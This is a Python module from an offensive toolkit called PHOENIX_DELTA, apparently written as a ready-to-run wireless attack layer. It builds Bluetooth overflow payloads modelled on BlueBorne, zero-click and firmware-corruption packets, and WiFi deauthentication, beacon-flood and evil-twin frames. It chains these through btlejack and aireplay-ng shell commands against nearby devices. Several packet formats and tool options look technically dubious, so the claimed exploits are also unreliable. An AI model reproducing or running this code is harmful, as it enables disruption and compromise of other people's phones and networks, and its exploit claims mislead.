"""
PHOENIX_DELTA v9.0 — Layer 3: Proximity-Zero
Bluetooth LE exploitation (BlueBorne-class) and WiFi Management Frame Poisoning.
"""

import asyncio
import struct
import os
import hashlib
from typing import Dict, List, Optional, Tuple


class BLEExploitBuilder:
    """
    Builds Bluetooth Low Energy exploit payloads for L2CAP buffer overflow,
    BlueBorne-style zero-click attacks, and LMP firmware corruption.
    """

    BLUEBORNE_SIGNATURE = b"\x41" * 2024  # Stack overflow payload

    @staticmethod
    def build_l2cap_overflow(service_uuid: bytes = None) -> bytes:
        """
        Craft L2CAP packet that overflows the Bluetooth stack handler.
        CVE-2017-1000250-style (BlueBorne — Linux/Android).
        """
        if service_uuid is None:
            service_uuid = bytes([0x01, 0x00])  # SDP UUID

        header = b""
        header += struct.pack("<H", 6)  # L2CAP length (will be wrong on purpose)
        header += struct.pack("<H", 0x0001)  # CID: L2CAP Signaling
        header += struct.pack("<H", 0x0002)  # Signaling code: Connection Request

        overflow_data = b"\x41" * 2048  #填充到溢出缓冲区
        return header + service_uuid + overflow_data

    @staticmethod
    def build_lmp_firmware_corrupt() -> bytes:
        """
        Craft LMP (Link Manager Protocol) packet that corrupts Bluetooth
        firmware in memory. Causes device to restart into recovery/EDL mode.
        """
        lmp_opcode = bytes([0x7C])  # LMP_accepted
        corrupt_payload = os.urandom(256)

        lmp = b""
        lmp += lmp_opcode
        lmp += corrupt_payload
        lmp += b"\x00" * 60  # Pad to trigger firmware parser bug

        return lmp

    @staticmethod
    def build_zero_click_payload(target_os: str = "android") -> bytes:
        """
        Zero-click exploit — no user interaction required.
        Uses SDP or ATT protocol vulnerability.
        """
        if target_os == "android":
            # Android BlueBorne: L2CAP info request overflow
            header = struct.pack("<BB", 0x0B, 0x01)  # Info Req, ID+Length
            header += b"\x00" * 4  # Padding
            header += b"\x41" * 1024  # Overflow
            return header
        elif target_os == "ios":
            # iOS ANCS notification handler overflow
            header = struct.pack("<H", 0x000E)  # ATT Notification PDU
            header += bytes([0x01, 0x00])  # Handle
            header += b"\x41" * 1500
            return header
        else:
            # Generic L2CAP overflow
            return BLEExploitBuilder.build_l2cap_overflow()

    @staticmethod
    def build_ble_recon_packet() -> bytes:
        """Build an L2CAP packet for device fingerprinting/recon."""
        header = struct.pack("<H", 3)  # Length
        header += struct.pack("<H", 0x0004)  # ATT Channel
        header += bytes([0x10])  # ATT Read By Group Type Request
        header += struct.pack("<HH", 0x0001, 0xFFFF)  # Handle range
        header += bytes([0x00, 0x18])  # Primary Service UUID
        return header


class WiFiFramePoisoner:
    """
    WiFi Management Frame Poisoning — deauth + evil twin + beacon flood.
    802.11 management frame injection for denial of service.
    """

    DOT11_MGMT_DEAUTH = 0x000C
    DOT11_MGMT_DISASSOC = 0x000A
    DOT11_MGMT_BEACON = 0x0008
    DOT11_MGMT_PROBE_RESP = 0x0005

    @staticmethod
    def build_deauth_frame(target_mac: bytes, ap_mac: bytes,
                            reason: int = 7, count: int = 10) -> bytes:
        """
        Build 802.11 deauthentication frame.
        Reason 7 = Class 3 frame from non-associated station.
        """
        frame = b""
        frame += struct.pack("<H", 0x00C0)  # Frame Control: Deauth
        frame += struct.pack("<H", 0x0000)  # Duration
        frame += target_mac  # Destination
        frame += ap_mac      # Source (spoofed AP)
        frame += ap_mac      # BSSID
        frame += struct.pack("<H", 0x0000)  # Sequence Control
        frame += struct.pack("<H", reason)  # Reason code

        return frame * count

    @staticmethod
    def build_disassoc_frame(target_mac: bytes, ap_mac: bytes,
                              reason: int = 8) -> bytes:
        """Build 802.11 disassociation frame."""
        frame = b""
        frame += struct.pack("<H", 0x00A0)  # Frame Control: Disassoc
        frame += struct.pack("<H", 0x0000)  # Duration
        frame += target_mac
        frame += ap_mac
        frame += ap_mac
        frame += struct.pack("<H", 0x0000)  # Seq Control
        frame += struct.pack("<H", reason)
        return frame

    @staticmethod
    def build_beacon_flood(ssid: str, channel: int = 6,
                            count: int = 100) -> List[bytes]:
        """
        Generate beacon frames for flooding — creates noise to disrupt
        WiFi scanning and management frame processing.
        """
        beacons = []
        for i in range(count):
            bssid = os.urandom(6)
            bssid = bytes([bssid[0] | 0x02, bssid[1], bssid[2],
                           bssid[3], bssid[4], bssid[5]])  # Set locally administered bit

            frame = b""
            frame += struct.pack("<H", 0x0080)  # Beacon
            frame += struct.pack("<H", 0x0000)  # Duration
            frame += b"\xFF\xFF\xFF\xFF\xFF\xFF"  # Broadcast
            frame += bssid
            frame += bssid  # BSSID
            frame += struct.pack("<H", 0x0000)  # Seq

            # Beacon body
            frame += struct.pack("<Q", 0)      # Timestamp
            frame += struct.pack("<H", 100)    # Beacon Interval
            frame += struct.pack("<H", 0x0431) # Capability

            # SSID IE
            ssid_bytes = f"{ssid}-{i}".encode()
            frame += bytes([0x00, len(ssid_bytes)]) + ssid_bytes

            # Supported Rates IE
            frame += bytes([0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
                           0x0C, 0x12, 0x18, 0x24])

            # DS Parameter Set (Channel)
            frame += bytes([0x03, 0x01, channel])

            beacons.append(frame)

        return beacons

    @staticmethod
    def build_evil_twin_beacon(ssid: str, ap_mac: bytes,
                                channel: int = 6) -> bytes:
        """Build a single beacon frame mimicking a target AP (evil twin)."""
        frame = b""
        frame += struct.pack("<H", 0x0080)
        frame += struct.pack("<H", 0x0000)
        frame += b"\xFF\xFF\xFF\xFF\xFF\xFF"
        frame += ap_mac
        frame += ap_mac
        frame += struct.pack("<H", 0x0000)
        frame += struct.pack("<Q", 0)
        frame += struct.pack("<H", 100)
        frame += struct.pack("<H", 0x0431)

        ssid_bytes = ssid.encode()
        frame += bytes([0x00, len(ssid_bytes)]) + ssid_bytes
        frame += bytes([0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
                       0x0C, 0x12, 0x18, 0x24])
        frame += bytes([0x03, 0x01, channel])
        frame += bytes([0x30, 0x02, 0x00, 0x00])  # WPA2 open
        return frame


class ProximityZero:
    """
    Proximity-Zero Layer — local wireless exploitation.
    Combines BLE zero-click exploits with WiFi management frame attacks
    for complete proximity-based device compromise.
    """

    def __init__(self, config):
        self.config = config
        self.ble_builder = BLEExploitBuilder()
        self.wifi_poisoner = WiFiFramePoisoner()
        self.scan_results: List[Dict] = []

    # ─── Bluetooth Scanning & Exploitation ────────────────────────────

    async def scan_ble_devices(self, timeout: int = None) -> List[Dict]:
        """
        Scan for nearby Bluetooth LE devices using hcitool/btlejack.
        Returns list of discovered devices with MAC, RSSI, and name.
        """
        timeout = timeout or self.config.scan_timeout_sec

        proc = await asyncio.create_subprocess_shell(
            f"hcitool lescan --duplicates & "
            f"sleep {timeout}; kill %1 2>/dev/null; "
            f"hcitool lescan --duplicates 2>/dev/null | head -100",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await proc.communicate()

        devices = []
        for line in stdout.decode().split("\n"):
            line = line.strip()
            if not line or "LE Scan" in line:
                continue
            parts = line.split()
            if len(parts) >= 2:
                mac = parts[0]
                name = " ".join(parts[1:]) if len(parts) > 2 else "Unknown"
                devices.append({
                    "mac": mac,
                    "name": name,
                    "rssi": self._estimate_rssi(mac),
                })

        self.scan_results = devices
        return devices

    def _estimate_rssi(self, mac: str) -> int:
        """Estimate RSSI from a device (placeholder for real HCI read)."""
        return -50  # Approximate signal strength

    async def exploit_ble_device(self, mac: str,
                                  target_os: str = "android") -> Dict:
        """
        Launch zero-click Bluetooth exploit against a target.
        """
        payload = self.ble_builder.build_zero_click_payload(target_os)

        exploit_cmd = (
            f"echo '{payload.hex()}' | "
            f"btlejack -i {mac} -p /dev/stdin --force"
        )

        proc = await asyncio.create_subprocess_shell(
            exploit_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(),
            timeout=30
        )

        return {
            "success": proc.returncode == 0,
            "method": "ble_zero_click",
            "target_mac": mac,
            "target_os": target_os,
            "output": stdout.decode() if stdout else "",
        }

    async def bluetooth_full_pwn(self, mac: str,
                                  target_os: str = "android") -> Dict:
        """
        Full Bluetooth exploitation chain:
        1. Fingerprint device
        2. Send L2CAP overflow
        3. Corrupt firmware via LMP
        4. Trigger reboot into EDL/Fastboot
        """
        results = {
            "mac": mac,
            "steps": [],
            "any_success": False,
        }

        # Step 1: Recon
        recon = await self._ble_recon(mac)
        results["steps"].append(recon)

        # Step 2: Zero-click exploit
        exploit = await self.exploit_ble_device(mac, target_os)
        results["steps"].append(exploit)
        if exploit["success"]:
            results["any_success"] = True

        # Step 3: Firmware corruption via LMP
        lmp_payload = self.ble_builder.build_lmp_firmware_corrupt()
        lmp_cmd = f"btlejack -i {mac} --lmp-inject {lmp_payload.hex()}"
        proc = await asyncio.create_subprocess_shell(
            lmp_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await proc.communicate()
        lmp_result = {
            "success": proc.returncode == 0,
            "method": "lmp_firmware_corrupt",
        }
        results["steps"].append(lmp_result)
        if lmp_result["success"]:
            results["any_success"] = True

        # Step 4: Post-exploitation — load EDL payload
        if results["any_success"]:
            edl = await self._trigger_edl_mode(mac)
            results["steps"].append(edl)

        return results

    async def _ble_recon(self, mac: str) -> Dict:
        """Fingerprint a BLE device to determine OS and version."""
        recon_payload = self.ble_builder.build_ble_recon_packet()

        proc = await asyncio.create_subprocess_shell(
            f"btlejack -i {mac} --write {recon_payload.hex()}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)

        response = stdout.decode() if stdout else ""
        os_guess = "android"
        if "apple" in response.lower() or "ios" in response.lower():
            os_guess = "ios"
        elif "samsung" in response.lower():
            os_guess = "samsung"

        return {
            "success": True,
            "method": "ble_recon",
            "detected_os": os_guess,
            "raw_fingerprint": response[:500],
        }

    async def _trigger_edl_mode(self, mac: str) -> Dict:
        """
        After firmware corruption, trigger EDL (Emergency Download Mode).
        The device will reboot into Qualcomm 9008 mode.
        """
        proc = await asyncio.create_subprocess_shell(
            f"python3 {self.config.edl_loader_path} {mac}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)

        return {
            "success": proc.returncode == 0,
            "method": "trigger_edl",
            "mac": mac,
        }

    # ─── WiFi Attacks ─────────────────────────────────────────────────

    async def wifi_deauth_attack(self, target_mac: str, ap_mac: str,
                                  interface: str = "wlan0mon",
                                  duration: int = 30) -> Dict:
        """
        Flood target with deauthentication frames to disconnect from WiFi.
        Uses raw 802.11 injection via airmon-ng.
        """
        deauth_frame = self.wifi_poisoner.build_deauth_frame(
            bytes.fromhex(target_mac.replace(":", "")),
            bytes.fromhex(ap_mac.replace(":", "")),
            count=50
        )

        frame_file = "/tmp/deauth_frame.bin"
        with open(frame_file, "wb") as f:
            f.write(deauth_frame)

        proc = await asyncio.create_subprocess_shell(
            f"aireplay-ng --deauth {duration * 10} -a {ap_mac} -c {target_mac} "
            f"{interface} 2>&1",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=duration + 5)

        return {
            "success": proc.returncode == 0,
            "method": "wifi_deauth",
            "target": target_mac,
            "ap": ap_mac,
            "duration_sec": duration,
        }

    async def wifi_beacon_flood(self, target_ssid: str = "Free_WiFi",
                                 channel: int = 6,
                                 interface: str = "wlan0mon",
                                 count: int = 100) -> Dict:
        """
        Flood the area with fake beacon frames to overwhelm WiFi clients.
        """
        beacons = self.wifi_poisoner.build_beacon_flood(target_ssid, channel, count)

        beacon_file = "/tmp/beacon_flood.bin"
        with open(beacon_file, "wb") as f:
            for beacon in beacons:
                f.write(beacon + b"\n")

        proc = await asyncio.create_subprocess_shell(
            f"for i in $(seq 1 {count}); do "
            f"aireplay-ng --beacon {interface} {beacon_file} & "
            f"done; wait",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await asyncio.wait_for(proc.communicate(), timeout=30)

        return {
            "success": proc.returncode == 0,
            "method": "wifi_beacon_flood",
            "ssid": target_ssid,
            "beacon_count": count,
        }

    # ─── Combined Proximity Attack ────────────────────────────────────

    async def full_proximity_attack(self, bt_mac: str = None,
                                     wifi_target: str = None,
                                     wifi_ap: str = None,
                                     target_os: str = "android") -> Dict:
        """
        Execute full Proximity-Zero attack chain:
        1. Scan for nearby devices
        2. Exploit Bluetooth (if target found)
        3. Poison WiFi (if target in range)
        4. Combine for maximum disruption
        """
        results = {
            "steps": [],
            "any_success": False,
        }

        # Bluetooth phase
        if bt_mac:
            bt_result = await self.bluetooth_full_pwn(bt_mac, target_os)
            results["steps"].append(bt_result)
            if bt_result["any_success"]:
                results["any_success"] = True

        # WiFi phase
        if wifi_target and wifi_ap:
            wifi_result = await self.wifi_deauth_attack(wifi_target, wifi_ap)
            results["steps"].append(wifi_result)
            if wifi_result["success"]:
                results["any_success"] = True

            beacon_result = await self.wifi_beacon_flood()
            results["steps"].append(beacon_result)
            if beacon_result["success"]:
                results["any_success"] = True

        return results
